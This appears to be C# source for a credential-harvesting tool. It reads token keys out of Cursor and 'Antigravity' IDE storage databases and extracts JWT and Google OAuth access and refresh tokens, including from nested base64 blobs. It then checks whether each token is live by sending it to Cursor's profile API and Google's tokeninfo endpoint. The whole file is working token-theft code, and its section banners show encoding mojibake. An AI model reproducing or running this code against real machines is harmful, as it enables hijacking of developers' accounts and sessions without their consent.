using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using CodepostEx.Models;
using Microsoft.Extensions.Logging;

namespace CodepostEx.Services;

public sealed class TokenExtractor
{
    private readonly VscdbService _vscdb;
    private readonly IHttpClientFactory _http;
    private readonly ILogger<TokenExtractor> _log;

    // Google OAuth access token prefix
    private static readonly Regex GoogleAccessToken = new(@"(ya29\.[A-Za-z0-9._\-]+)", RegexOptions.Compiled);
    // Google refresh token prefix
    private static readonly Regex GoogleRefreshToken = new(@"(1//[A-Za-z0-9._\-]+)", RegexOptions.Compiled);
    // Base64 strings â‰¥40 chars (for nested decode in Antigravity blob)
    private static readonly Regex Base64Chunk = new(@"[A-Za-z0-9+/=]{40,}", RegexOptions.Compiled);

    public TokenExtractor(VscdbService vscdb, IHttpClientFactory http, ILogger<TokenExtractor> log)
    {
        _vscdb = vscdb;
        _http = http;
        _log  = log;
    }

    public IReadOnlyList<TokenResult> Extract(IdeTarget target)
    {
        var profile = target.Profile;
        if (profile.TokenKeys.Length == 0)
            return [];

        var dbPath = target.GlobalStoragePath;
        if (!File.Exists(dbPath))
            return [];

        var results = new List<TokenResult>();

        using var conn = _vscdb.OpenReadOnly(dbPath);
        if (conn is null) return [];

        foreach (var key in profile.TokenKeys)
        {
            var raw = VscdbService.GetValue(conn, key);
            if (string.IsNullOrWhiteSpace(raw)) continue;

            if (key == "antigravityUnifiedStateSync.oauthToken")
            {
                foreach (var (tokenType, value) in ParseAntigravityOAuth(raw))
                    results.Add(new TokenResult(profile.Name, tokenType, key, value, dbPath));
                continue;
            }

            var tokenType2 = key.Contains("accessToken", StringComparison.OrdinalIgnoreCase)
                ? "AccessToken" : "RefreshToken";

            if (!IsJwt(raw)) continue;
            results.Add(new TokenResult(profile.Name, tokenType2, key, raw.Trim(), dbPath));
        }

        return results;
    }

    public TokenResult Analyze(TokenResult entry, bool decode, bool validate)
    {
        if (!decode && !validate)
            return entry;

        TokenAnalysis? analysis = null;

        if (IsJwt(entry.Value))
            analysis = AnalyzeJwt(entry.Value, validate);
        else
            analysis = AnalyzeOAuth(entry.Value, entry.TokenType, validate);

        return entry with { Analysis = analysis };
    }

    // â”€â”€ JWT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    private static bool IsJwt(string value) =>
        value.StartsWith("eyJ", StringComparison.Ordinal) &&
        value.Count(c => c == '.') == 2;

    private TokenAnalysis AnalyzeJwt(string token, bool validate)
    {
        JsonDocument? payload = null;
        JsonDocument? header  = null;
        try
        {
            var parts = token.Split('.');
            header  = JsonDocument.Parse(Base64UrlDecode(parts[0]));
            payload = JsonDocument.Parse(Base64UrlDecode(parts[1]));
        }
        catch
        {
            header?.Dispose();
            payload?.Dispose();
            return new TokenAnalysis("Jwt", null, null, null, null, null, null, null, null, null, "ParseError", null);
        }

        try
        {
            DateTimeOffset? expiresAt = null;
            DateTimeOffset? issuedAt  = null;
            bool isExpired = false;

            if (payload.RootElement.TryGetProperty("exp", out var exp))
            {
                expiresAt = DateTimeOffset.FromUnixTimeSeconds(exp.GetInt64()).ToLocalTime();
                isExpired = expiresAt < DateTimeOffset.Now;
            }
            if (payload.RootElement.TryGetProperty("iat", out var iat))
                issuedAt = DateTimeOffset.FromUnixTimeSeconds(iat.GetInt64()).ToLocalTime();

            string? sub   = GetStr(payload, "sub");
            string? iss   = GetStr(payload, "iss");
            string? aud   = GetStr(payload, "aud");
            string? type  = GetStr(payload, "type");
            string? scope = GetStr(payload, "scope");
            string? alg   = GetStr(header, "alg");

            var status = isExpired ? "Expired" : "Valid";
            string? net = null;

            if (validate && !isExpired)
            {
                net = ValidateJwtOnline(token);
                if (net == "Invalid") status = "InvalidOnline";
            }

            return new TokenAnalysis("Jwt", alg, sub, iss, aud, type, scope, issuedAt, expiresAt, isExpired, status, net);
        }
        finally
        {
            header?.Dispose();
            payload?.Dispose();
        }
    }

    private string ValidateJwtOnline(string token)
    {
        try
        {
            var client = _http.CreateClient("TokenValidator");
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
            var resp = client.GetAsync("https://api2.cursor.sh/auth/full_stripe_profile").GetAwaiter().GetResult();
            return resp.IsSuccessStatusCode ? "AcceptedOnline" : (resp.StatusCode == System.Net.HttpStatusCode.Unauthorized ? "Invalid" : "UnknownOnline");
        }
        catch (Exception ex)
        {
            return $"NetworkError:{ex.Message}";
        }
    }

    // â”€â”€ Google OAuth â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    private TokenAnalysis AnalyzeOAuth(string token, string tokenType, bool validate)
    {
        if (token.StartsWith("ya29.", StringComparison.Ordinal))
        {
            var status = "Valid";
            string? net = null;
            DateTimeOffset? expiresAt = null;

            if (validate)
            {
                net = ValidateGoogleOAuthOnline(token, out var expiresIn);
                if (net == "Invalid") status = "InvalidOnline";
                else if (expiresIn.HasValue)
                {
                    if (expiresIn.Value <= 0) status = "Expired";
                    else expiresAt = DateTimeOffset.Now.AddSeconds(expiresIn.Value);
                }
            }

            return new TokenAnalysis("GoogleOAuth", null, null, null, null, null, null, null, expiresAt, null, status, net);
        }

        if (token.StartsWith("1//", StringComparison.Ordinal))
        {
            return new TokenAnalysis("GoogleRefresh", null, null, null, null, null, null, null, null, null, "Unknown",
                validate ? "RefreshTokenNoLocalExpiry" : null);
        }

        return new TokenAnalysis("Unknown", null, null, null, null, null, null, null, null, null, "Unknown", null);
    }

    private string ValidateGoogleOAuthOnline(string token, out int? expiresIn)
    {
        expiresIn = null;
        try
        {
            var client = _http.CreateClient("TokenValidator");
            var content = new FormUrlEncodedContent([new KeyValuePair<string, string>("access_token", token)]);
            var resp = client.PostAsync("https://oauth2.googleapis.com/tokeninfo", content).GetAwaiter().GetResult();
            var body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult();

            if (!resp.IsSuccessStatusCode) return "Invalid";

            using var doc = JsonDocument.Parse(body);
            if (doc.RootElement.TryGetProperty("error", out _)) return "Invalid";
            if (doc.RootElement.TryGetProperty("expires_in", out var ei))
            {
                expiresIn = ei.GetInt32();
                return $"expires_in:{expiresIn}";
            }
            return "AcceptedOnline";
        }
        catch (Exception ex)
        {
            return $"NetworkError:{ex.Message}";
        }
    }

    // â”€â”€ Antigravity blob â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    private static IEnumerable<(string Type, string Value)> ParseAntigravityOAuth(string base64Value)
    {
        byte[]? bytes;
        try { bytes = Convert.FromBase64String(PadBase64(base64Value)); }
        catch { yield break; }

        var texts = new List<string> { Encoding.UTF8.GetString(bytes) };

        foreach (Match m in Base64Chunk.Matches(texts[0]))
        {
            try
            {
                var inner = Encoding.UTF8.GetString(Convert.FromBase64String(PadBase64(m.Value)));
                if (inner.Length > 0) texts.Add(inner);
            }
            catch { }
        }

        bool accessFound = false, refreshFound = false;
        foreach (var text in texts.Distinct())
        {
            if (!accessFound)
            {
                var m = GoogleAccessToken.Match(text);
                if (m.Success) { accessFound = true; yield return ("AccessToken", m.Groups[1].Value); }
            }
            if (!refreshFound)
            {
                var m = GoogleRefreshToken.Match(text);
                if (m.Success) { refreshFound = true; yield return ("RefreshToken", m.Groups[1].Value); }
            }
            if (accessFound && refreshFound) break;
        }
    }

    // â”€â”€ Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

    private static string Base64UrlDecode(string s)
    {
        s = s.Replace('-', '+').Replace('_', '/');
        var pad = (4 - s.Length % 4) % 4;
        s += new string('=', pad);
        return Encoding.UTF8.GetString(Convert.FromBase64String(s));
    }

    private static string PadBase64(string s)
    {
        var pad = (4 - s.Length % 4) % 4;
        return pad == 0 ? s : s + new string('=', pad);
    }

    private static string? GetStr(JsonDocument? doc, string prop)
    {
        if (doc is null) return null;
        return doc.RootElement.TryGetProperty(prop, out var v) ? v.ToString() : null;
    }
}

